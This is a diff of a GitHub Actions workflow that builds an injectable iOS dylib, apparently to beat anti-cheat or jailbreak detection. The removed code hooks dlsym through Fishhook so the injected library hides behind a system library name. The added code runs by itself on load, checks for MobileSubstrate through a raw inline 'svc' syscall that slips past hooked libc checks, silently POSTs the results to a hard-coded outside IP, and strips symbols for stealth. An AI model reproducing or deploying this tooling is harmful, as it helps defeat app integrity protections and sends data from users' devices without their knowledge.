@@ -1,4 +1,4 @@
-name: Imperial V-MAX - Professional Security Research (No-JB PoC)
+name: Imperial V-MAX - SVC Syscall Network PoC
 
 on:
   push:
@@ -6,92 +6,92 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_masoud_fortress:
-    name: Build Elite Security Dylib (Fishhook PoC)
+  build_svc_poc:
+    name: Build SVC Bypass Network Proof
     runs-on: macos-latest
 
     steps:
       - name: 📥 Checkout Repository
         uses: actions/checkout@v4
 
-      - name: 🎣 Fetch Fishhook Engine (No-JB Safe Hooking)
+      - name: 🧪 Generate Network SVC Proof Source (Main.mm)
         run: |
           mkdir -p jni
-          echo "Fetching Fishhook (Safe Symbol Rebinding)..."
-          # سحب ملفات Fishhook الرسمية لأنها الأداة الوحيدة الآمنة لدوال C بدون جلبريك
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
-
-      - name: 🧪 Generate Poisoned Well Source (Main.mm)
-        run: |
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
-          #import <dlfcn.h>
-          #import <mach-o/dyld.h>
-          #import <string.h>
-          #include "fishhook.h" // استخدام محرك الخطاف الآمن بدل Dobby
+          #import <unistd.h>
+          #import <sys/syscall.h>
 
           /**
-           * 🛡️ PROJECT: THE POISONED WELL (V-MAX PoC - NO JB)
+           * 🛡️ PROJECT: SVC INLINE SYSCALL BYPASS (NETWORK PoC)
            * 👨‍💻 RESEARCHER: MASOUD (NASIRIYAH)
-           * 🔍 TARGET: Safe Symbol Resolution Spoofing (Fishhook)
            */
 
-          static void* (*orig_dlsym)(void* handle, const char* symbol);
-          static const char* (*orig_dyld_get_image_name)(uint32_t image_index);
+          // ⚠️ غير هذا الـ IP إلى الـ IP الخاص بلابتوبك الذي يظهر في سكربت البايثون
+          #define RADAR_SERVER_URL @"http://34.204.178.160:8080" 
 
-          // دالة التزييف - تخفي الدايلب وتعيد اسم مكتبة نظام رسمية
-          const char* hk_dyld_get_image_name(uint32_t image_index) {
-              const char* real_name = orig_dyld_get_image_name(image_index);
-              if (real_name && (strstr(real_name, "Masoud") || strstr(real_name, "VMAX"))) {
-                  return "/usr/lib/libobjc.A.dylib";
-              }
-              return real_name;
+          int check_file_standard(const char *path) {
+              return access(path, F_OK); 
           }
 
-          // هوك dlsym - يقوم بتسميم النتائج العائدة لـ IDA
-          void* hk_dlsym(void* handle, const char* symbol) {
-              // حماية من الكراش (EXC_BAD_ACCESS)
-              if (!symbol) return orig_dlsym(handle, symbol);
-
-              if (strcmp(symbol, "_dyld_get_image_name") == 0) {
-                  return (void*)hk_dyld_get_image_name; // تقديم الدالة المسمومة
-              }
-              return orig_dlsym(handle, symbol);
+          int check_file_svc(const char *path) {
+              int result;
+              __asm__ volatile (
+                  "mov x0, %1\n"
+                  "mov x1, #0\n"
+                  "mov x16, #33\n"
+                  "svc #0x80\n"
+                  "mov %w0, w0\n"
+                  : "=r" (result)
+                  : "r" (path)
+                  : "x0", "x1", "x16", "memory"
+              );
+              return result;
           }
 
-          __attribute__((constructor(101)))
-          static void initialize_fortress() {
-              // الحصول على العنوان الأصلي لدالة فحص الملفات
-              orig_dyld_get_image_name = (const char* (*)(uint32_t))dlsym(RTLD_DEFAULT, "_dyld_get_image_name");
-
-              // استخدام Fishhook لتبديل العناوين بجداول الذاكرة (آمن جداً بدون جلبريك)
-              struct rebinding rebinds[] = {
-                  {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym}
-              };
-              
-              rebind_symbols(rebinds, 1);
-              
-              NSLog(@"[V-MAX PoC] 🏰 No-JB Security Shield Integrated. dlsym is poisoned via Fishhook.");
+          __attribute__((constructor))
+          static void run_svc_proof() {
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
+                  
+                  // ملف وهمي أو ملف أداة جلبريك للبحث عنه
+                  const char *cheat_file = "/Library/MobileSubstrate/MobileSubstrate.dylib";
+                  
+                  int std_result = check_file_standard(cheat_file);
+                  int svc_result = check_file_svc(cheat_file);
+                  
+                  // تجهيز البيانات لإرسالها للرادار (اللابتوب)
+                  NSDictionary *payload = @{
+                      @"standard_result": @(std_result),
+                      @"svc_result": @(svc_result)
+                  };
+                  
+                  NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+                  
+                  if (jsonData) {
+                      NSURL *url = [NSURL URLWithString:RADAR_SERVER_URL];
+                      NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+                      [request setHTTPMethod:@"POST"];
+                      [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+                      [request setHTTPBody:jsonData];
+                      
+                      // إرسال الضربة بصمت
+                      [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
+                  }
+              });
           }
           EOF
 
-      - name: 🚀 Compile Professional Dylib
+      - name: 🚀 Compile Network SVC PoC Dylib
         run: |
-          # تجميع الكود مع ملفات Fishhook لإنتاج دايلب مستقر
-          clang++ -dynamiclib -std=c++11 \
+          clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 \
-          jni/main.mm jni/fishhook.c \
-          -o Masoud-VMAX-Elite.dylib \
-          -framework Foundation -framework UIKit -lobjc \
-          -install_name @rpath/Masoud-VMAX-Elite.dylib
-          
-          # مسح الرموز الدلالية للتخفي
-          strip -x Masoud-VMAX-Elite.dylib
+          jni/main.mm \
+          -o Masoud-SVC-Network.dylib \
+          -framework Foundation
+          strip -x Masoud-SVC-Network.dylib
 
-      - name: 📦 Archive Build Artifact
+      - name: 📦 Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-Elite-Fortress-PoC-NoJB
-          path: Masoud-VMAX-Elite.dylib
+          name: Masoud-SVC-Network-Dylib
+          path: Masoud-SVC-Network.dylib
